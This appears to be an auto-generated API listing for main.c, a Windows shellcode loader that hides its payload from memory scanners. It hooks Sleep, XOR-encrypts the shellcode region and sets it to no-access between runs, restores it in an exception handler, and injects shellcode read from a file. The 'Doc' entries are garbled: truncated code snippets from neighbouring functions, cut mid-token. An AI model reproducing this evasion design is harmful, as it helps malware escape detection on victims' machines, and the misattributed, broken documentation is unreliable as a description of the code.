# API

## main.c

### get_return_address `static inline UPTR get_return_address(void)`
- Defined: `main.c:2`
- Doc: include "header.h"

### MySleep `static void WINAPI MySleep(DWORD ms)`
- Defined: `main.c:18`
- Doc: { #ifdef _WIN64 return (UPTR)__builtin_return_address(0); #else /* 32 bits – también funciona return (UPTR)__builtin_ret

### fastTrampoline `bool fastTrampoline(bool install, BYTE *target, LPVOID jump, HookTrampolineBuffers *b)`
- Defined: `main.c:43`
- Doc: b.originalBytesSize = sizeof(g_hookedSleep.sleepStub); /* des-hook temporal fastTrampoline(false, (BYTE*)Sleep, (LPVOID)

### xor32 `void xor32(uint8_t *buf, SIZE_T sz, uint32_t key)`
- Defined: `main.c:93`
- Doc: memcpy(target, b->originalBytes, b->originalBytesSize); size = b->originalBytesSize; } typeNtFlushInstructionCache fn; f

### collectMemPriv `static void collectMemPriv(void)`
- Defined: `main.c:104`

### initializeShellcodeFluctuation `void initializeShellcodeFluctuation(LPVOID caller)`
- Defined: `main.c:131`
- Doc: (mbi.Protect & (PAGE_EXECUTE_READWRITE|PAGE_EXECUTE_READ|PAGE_READWRITE)) ) { if (used == alloc) { alloc = alloc ? alloc

### isShellcodeThread `bool isShellcodeThread(LPVOID addr)`
- Defined: `main.c:159`
- Doc: g_fluctuationData.shellcodeSize = m->RegionSize; g_fluctuationData.currentlyEncrypted = false; g_fluctuationData.encodeK

### shellcodeEncryptDecrypt `void shellcodeEncryptDecrypt(LPVOID caller)`
- Defined: `main.c:169`
- Doc: ExitProcess(0); } /* ------------- es thread shellcode? -- bool isShellcodeThread(LPVOID addr) { MEMORY_BASIC_INFORMATIO

### VEHHandler `LONG NTAPI VEHHandler(PEXCEPTION_POINTERS xp)`
- Defined: `main.c:207`
- Doc: VirtualProtect(g_fluctuationData.shellcodeAddr, g_fluctuationData.shellcodeSize, PAGE_NOACCESS, &old); log("[>] Flipped 

### readShellcode `bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize)`
- Defined: `main.c:230`
- Doc: #endif log("[.] AV at 0x%p", (void*)ip); UPTR base = (UPTR)g_fluctuationData.shellcodeAddr; UPTR end  = base + g_fluctua

### runShellcode `static DWORD WINAPI runShellcode(LPVOID param)`
- Defined: `main.c:244`
- Doc: bool readShellcode(const char *path, uint8_t **out, SIZE_T *outSize) { HANDLE h = CreateFileA(path,GENERIC_READ,FILE_SHA

### injectShellcode `bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread)`
- Defined: `main.c:249`

### main `int main(int argc, char **argv)`
- Defined: `main.c:264`
- Doc: bool injectShellcode(uint8_t *sc, SIZE_T scSize, HANDLE *outThread) { void *mem = VirtualAlloc(NULL,scSize,MEM_COMMIT,PA
